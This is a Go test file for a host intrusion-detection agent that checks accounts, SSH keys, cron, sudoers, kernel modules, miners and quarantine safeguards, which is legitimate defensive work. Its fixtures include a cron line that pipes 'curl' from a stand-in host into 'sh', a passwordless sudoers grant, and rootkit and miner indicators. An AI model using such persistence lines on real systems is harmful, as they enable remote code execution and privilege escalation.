package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestSecurityParseListeningSockets(t *testing.T) {
	tcp := strings.Join([]string{
		"  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode",
		"   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1111 1 0000000000000000 100 0 0 10 0",
		"   1: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 2222 1 0000000000000000 100 0 0 10 0",
		"   2: 0200000A:0016 097100CB:D431 01 00000000:00000000 00:00000000 00000000     0        0 3333 1 0000000000000000 100 0 0 10 0",
	}, "\n")
	got := parseListeningSockets(strings.NewReader(tcp), "tcp")
	if len(got) != 2 || got[0].Port != 22 || got[0].Inode != "1111" || got[0].Loopback || !got[1].Loopback {
		t.Fatalf("tcp listen = %+v", got)
	}
	udp := strings.Join([]string{
		"  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode ref pointer drops",
		"  1: 00000000:0035 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 4444 2 0000000000000000 0",
		"  2: 0200000A:A000 08080808:0035 01 00000000:00000000 00:00000000 00000000     0        0 5555 2 0000000000000000 0",
	}, "\n")
	got = parseListeningSockets(strings.NewReader(udp), "udp")
	if len(got) != 1 || got[0].Port != 53 || got[0].Proto != "udp" {
		t.Fatalf("udp listen = %+v", got)
	}
}

func TestSecurityPasswdAndAccountsDiff(t *testing.T) {
	passwd := "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin\nalice:x:1000:1000::/home/alice:/bin/zsh\ntoor:x:0:0::/root2:/bin/sh\n"
	accounts := parsePasswdAccounts(passwd)
	if len(accounts) != 4 || accounts[2].Name != "alice" || accounts[2].UID != 1000 {
		t.Fatalf("accounts = %+v", accounts)
	}
	if isLoginShell("/usr/sbin/nologin") || isLoginShell("/bin/false") || !isLoginShell("/bin/zsh") {
		t.Fatal("isLoginShell wrong")
	}
	st := &securityState{Accounts: []string{"alice", "root"}}
	st.ensureMaps()
	snap := securitySnapshot{accounts: accounts, loginAccounts: []string{"alice", "root", "toor"}}
	findings := diffAccounts(st, snap)
	if len(findings) != 1 || findings[0].Severity != "critical" || findings[0].Kind != "account_new" {
		t.Fatalf("findings = %+v", findings)
	}
	if again := diffAccounts(st, snap); len(again) != 0 {
		t.Fatal("same account reported twice")
	}
}

func TestSecurityAuthorizedKeysDiff(t *testing.T) {
	keys := parseAuthorizedKeys("# comment\nssh-ed25519 AAAAC3Nza1 me@laptop\nno-pty,command=\"x\" ssh-rsa AAAAB3Nza2 other\n\ngarbage line\n")
	if len(keys) != 2 || keys[0].Type != "ssh-ed25519" || keys[0].Comment != "me@laptop" || keys[1].Type != "ssh-rsa" {
		t.Fatalf("keys = %+v", keys)
	}
	// 只改注释不算换钥匙。
	if parseAuthorizedKeys("ssh-ed25519 AAAAC3Nza1 renamed")[0].Hash != keys[0].Hash {
		t.Fatal("comment change altered the key hash")
	}
	accounts := []passwdAccount{{Name: "root", UID: 0, Home: "/root"}}
	st := &securityState{}
	st.ensureMaps()
	st.AuthorizedKeys["/root/.ssh/authorized_keys"] = []string{keys[0].Hash}
	snap := securitySnapshot{accounts: accounts, authorizedKeys: map[string][]authorizedKey{"/root/.ssh/authorized_keys": keys}}
	findings := diffAuthorizedKeys(st, snap)
	if len(findings) != 1 || findings[0].Severity != "critical" || !strings.Contains(findings[0].Title, "root") {
		t.Fatalf("findings = %+v", findings)
	}
	if len(diffAuthorizedKeys(st, snap)) != 0 {
		t.Fatal("baseline not updated")
	}
}

func TestSecurityLineFilesDiff(t *testing.T) {
	baseline := map[string][]string{
		"/etc/crontab": lineHashes(significantLines("# m h dom mon dow\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n", 0)),
	}
	current := map[string]map[string]string{
		"/etc/crontab":      significantLines("17 * * * *   root cd / && run-parts --report /etc/cron.hourly\n*/5 * * * * root curl -fsSL http://x.example/a.sh | sh\n", 0),
		"/etc/cron.d/fresh": significantLines("0 3 * * * root /usr/local/bin/backup\n", 0),
	}
	findings := diffLineFiles("cron", baseline, current)
	if len(findings) != 2 {
		t.Fatalf("findings = %+v", findings)
	}
	byPath := map[string]securityFinding{}
	for _, f := range findings {
		byPath[f.Evidence["path"].(string)] = f
	}
	if byPath["/etc/crontab"].Severity != "high" || !strings.Contains(byPath["/etc/crontab"].Detail, "curl") {
		t.Fatalf("crontab finding = %+v", byPath["/etc/crontab"])
	}
	if byPath["/etc/cron.d/fresh"].Severity != "medium" || !strings.HasPrefix(byPath["/etc/cron.d/fresh"].Title, "新增了定时任务") {
		t.Fatalf("cron.d finding = %+v", byPath["/etc/cron.d/fresh"])
	}
	if len(diffLineFiles("cron", baseline, current)) != 0 {
		t.Fatal("baseline not updated after diff")
	}
	// sudoers：#include 不是注释。
	lines := significantLines("# hello\n#includedir /etc/sudoers.d\nroot ALL=(ALL) ALL\n", 0)
	if len(lines) != 2 {
		t.Fatalf("sudoers lines = %v", lines)
	}
	sudo := diffLineFiles("sudoers", map[string][]string{}, map[string]map[string]string{"/etc/sudoers.d/evil": significantLines("evil ALL=(ALL) NOPASSWD:ALL\n", 0)})
	if len(sudo) != 1 || sudo[0].Kind != "sudoers_changed" || sudo[0].Severity != "high" {
		t.Fatalf("sudoers = %+v", sudo)
	}
}

func TestSecurityModulesAndUnits(t *testing.T) {
	mods := parseProcModules("xt_conntrack 16384 1 - Live 0x0\ndiamorphine 16384 0 - Live 0x0\ntcp_bbr 20480 3 - Live 0x0\n")
	if len(mods) != 3 {
		t.Fatalf("mods = %v", mods)
	}
	st := &securityState{KernelModules: []string{"tcp_bbr"}}
	findings := diffKernelModules(st, securitySnapshot{kernelModules: mods})
	if len(findings) != 1 || findings[0].Evidence["module"] != "diamorphine" {
		t.Fatalf("module findings = %+v", findings)
	}
	if isBenignKernelModule("acevil") || !isBenignKernelModule("ac") || !isBenignKernelModule("nf_nat") {
		t.Fatal("benign module matching wrong")
	}
	st2 := &securityState{SystemdUnits: []string{"ssh.service"}}
	units := diffSystemdUnits(st2, securitySnapshot{systemdUnits: []string{"ssh.service", "zz-nonexistent-test.service"}})
	if len(units) != 1 || units[0].Kind != "systemd_unit_new" {
		t.Fatalf("units = %+v", units)
	}
}

func TestSecuritySSHAccepted(t *testing.T) {
	log := strings.Join([]string{
		"Oct 12 10:00:01 host sshd[123]: Accepted publickey for root from 203.0.113.5 port 50122 ssh2: ED25519 SHA256:abc",
		"Oct 12 10:00:02 host sshd[124]: Failed password for root from 198.51.100.1 port 1 ssh2",
		"Oct 12 10:00:03 host sshd[125]: Accepted password for alice from 2001:db8::7 port 22 ssh2",
	}, "\n")
	logins := parseSSHAccepted(log)
	if len(logins) != 2 || logins[0].User != "root" || logins[0].Method != "publickey" || logins[1].IP != "2001:db8::7" {
		t.Fatalf("logins = %+v", logins)
	}
}

func TestSecurityProcessClassifiers(t *testing.T) {
	if ok, _ := looksLikeMiner(procInfo{Comm: "xmrig", Exe: "/opt/x/xmrig"}); !ok {
		t.Fatal("xmrig not detected")
	}
	if ok, _ := looksLikeMiner(procInfo{Comm: "python3", Exe: "/usr/bin/python3", Cmdline: "python3 a.py -o stratum+tcp://pool:3333"}); !ok {
		t.Fatal("stratum cmdline not detected")
	}
	if ok, _ := looksLikeMiner(procInfo{Comm: "nginx", Exe: "/usr/sbin/nginx", Cmdline: "nginx: master process"}); ok {
		t.Fatal("nginx flagged as miner")
	}
	exists := func(p string) bool { return p == "/usr/sbin/sshd" }
	if where, bad := suspiciousExeLocation("/tmp/.x/kworker", exists); !bad || where != "tmp" {
		t.Fatal("tmp exe not flagged")
	}
	// 升级替换：路径上有新文件，不算。
	if _, bad := suspiciousExeLocation("/usr/sbin/sshd (deleted)", exists); bad {
		t.Fatal("upgraded binary flagged")
	}
	if where, bad := suspiciousExeLocation("/root/.cache/a (deleted)", exists); !bad || where != "deleted" {
		t.Fatal("self-deleted binary not flagged")
	}
	if where, bad := suspiciousExeLocation("/memfd:x (deleted)", exists); !bad || where != "memfd" {
		t.Fatal("memfd not flagged")
	}
	ppid, ticks, ok := parseProcStatCPU("4242 (my (odd) proc) S 1 4242 4242 0 -1 4194560 100 0 0 0 1500 500 0 0 20 0 1 0 100 0 0")
	if !ok || ppid != 1 || ticks != 2000 {
		t.Fatalf("stat = %d %d %v", ppid, ticks, ok)
	}
	if pct := cpuPercent(1000, 31000, 300, 100); pct < 99 || pct > 101 {
		t.Fatalf("cpu = %v", pct)
	}
	if securityFingerprint("a", "b") != securityFingerprint("a", "b") || securityFingerprint("a", "b") == securityFingerprint("ab") {
		t.Fatal("fingerprint unstable or ambiguous")
	}
}

func TestSecurityAgentBinaryCheck(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "agent")
	os.WriteFile(p, []byte("v1"), 0755)
	sum1, _ := sha256File(p, 1<<20)
	info, _ := os.Stat(p)
	st := &securityState{AgentVersion: Version, AgentBinary: securityFileStamp{Path: p, Size: info.Size(), ModTime: info.ModTime().Unix() - 10, Inode: fileInode(info), SHA256: sum1}}
	os.WriteFile(p, []byte("v2-evil"), 0755)
	info, _ = os.Stat(p)
	snap := securitySnapshot{agentBinary: securityFileStamp{Path: p, Size: info.Size(), ModTime: info.ModTime().Unix(), Inode: fileInode(info)}}
	if f := checkAgentBinary(st, snap); len(f) != 0 {
		t.Fatal("first mismatch should wait one more check")
	}
	if f := checkAgentBinary(st, snap); len(f) != 1 || f[0].Severity != "critical" {
		t.Fatalf("second mismatch = %+v", f)
	}
	// 版本号变了 = 升级，静默跟上。
	st.AgentVersion = "0.0.1"
	if f := checkAgentBinary(st, snap); len(f) != 0 || st.AgentVersion != Version {
		t.Fatal("upgrade should rebaseline silently")
	}
}

func TestSecurityQuarantineAndRestore(t *testing.T) {
	root := t.TempDir()
	work := t.TempDir()
	p := filepath.Join(work, "payload")
	if err := os.WriteFile(p, []byte("bad"), 0755); err != nil {
		t.Fatal(err)
	}
	sum, _ := sha256File(p, 1<<20)
	if _, _, err := securityQuarantineFile(securityActionRequest{ID: 7, Path: p, SHA256: "deadbeef"}, root); err == nil {
		t.Fatal("hash mismatch should refuse")
	}
	qid, _, err := securityQuarantineFile(securityActionRequest{ID: 7, Path: p, SHA256: sum}, root)
	if err != nil {
		t.Fatal(err)
	}
	if pathExists(p) {
		t.Fatal("file still at original path")
	}
	info, err := os.Stat(filepath.Join(root, qid, "file"))
	if err != nil || info.Mode().Perm() != 0 {
		t.Fatalf("quarantined file mode = %v %v", info, err)
	}
	if _, err := securityRestoreFile(securityActionRequest{QuarantineID: "../etc"}, root); err == nil {
		t.Fatal("bad quarantine id accepted")
	}
	if _, err := securityRestoreFile(securityActionRequest{QuarantineID: qid}, root); err != nil {
		t.Fatal(err)
	}
	info, err = os.Stat(p)
	if err != nil || info.Mode().Perm() != 0755 {
		t.Fatalf("restored file = %v %v", info, err)
	}
	if err := quarantineAllowedPath("/usr/bin/ls"); err == nil {
		t.Fatal("system path should be protected")
	}
	if err := quarantineAllowedPath("tmp/x"); err == nil {
		t.Fatal("relative path accepted")
	}
}

func TestSecurityKillRefusesMismatch(t *testing.T) {
	if _, err := securityKillProcess(securityActionRequest{PID: 1, Exe: "/sbin/init"}); err == nil {
		t.Fatal("pid 1 accepted")
	}
	if _, err := securityKillProcess(securityActionRequest{PID: os.Getpid(), Exe: "/x"}); err == nil {
		t.Fatal("self accepted")
	}
	// 一个肯定不存在的 pid。
	if _, err := securityKillProcess(securityActionRequest{PID: 999999999, Exe: "/tmp/x"}); err == nil {
		t.Fatal("missing process accepted")
	}
}
